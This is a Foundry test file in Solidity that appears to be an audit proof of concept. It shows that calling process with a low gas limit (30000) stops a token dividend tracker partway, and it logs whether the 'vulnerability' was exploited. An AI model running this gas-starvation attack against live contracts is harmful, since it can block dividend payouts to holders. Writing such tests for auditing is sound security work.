// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/AANT.sol";

contract AANTGasManipulationTest is Test {
    AANTDividendTracker public tracker;
    uint256 public constant MIN_TOKEN_BALANCE = 1 * (10**18);
    address[] public holders;

    function setUp() public {
        tracker = new AANTDividendTracker();
        
        // Create 10 token holders above minimum token threshold
        for (uint i = 0; i < 10; i++) {
            address holder = address(uint160(i + 1000));
            holders.push(holder);
            tracker.setBalance(payable(holder), MIN_TOKEN_BALANCE * 2);
        }
    }

    function testMinerCanPreventFullDividendProcessing() public {
        // Get initial state BEFORE attack
        uint256 lastProcessedIndexBefore = tracker.lastProcessedIndex();
        uint256 holdersCountBefore = tracker.getNumberOfTokenHolders();
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("Last processed index:", lastProcessedIndexBefore);
        console.log("Current token holders count:", holdersCountBefore);
        console.log("");
        
        console.log("--- Trigger Attack: process(30000) ---");
        // Process dividends with insufficient gas (simulate miner manipulation)
        tracker.process(30000);
        
        // Get state AFTER attack
        uint256 lastProcessedIndexAfter = tracker.lastProcessedIndex();
        uint256 holdersCountAfter = tracker.getNumberOfTokenHolders();
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Last processed index:", lastProcessedIndexAfter);
        console.log("Current token holders count:", holdersCountAfter);
        
        // Log comparison verdict
        console.log("");
        console.log("--- COMPARISON VERDICT ---");
        bool indexAdvancedButNotCompleted = lastProcessedIndexAfter > lastProcessedIndexBefore && 
            lastProcessedIndexAfter < holdersCountAfter - 1;
        bool holdersUnchanged = holdersCountBefore == holdersCountAfter;
        
        if (indexAdvancedButNotCompleted && holdersUnchanged) {
            console.log("STATE CHANGED - Vulnerability SUCCESSFULLY exploited!");
            console.log("Vulnerability Exists: Miner was able to interrupt dividend processing, preventing full payout");
        } else {
            console.log("State unchanged or unexpected values - vulnerability NOT exploited");
            console.log("Vulnerability not Exist: Processing completed fully or holders count changed unexpectedly");
        }
    }
}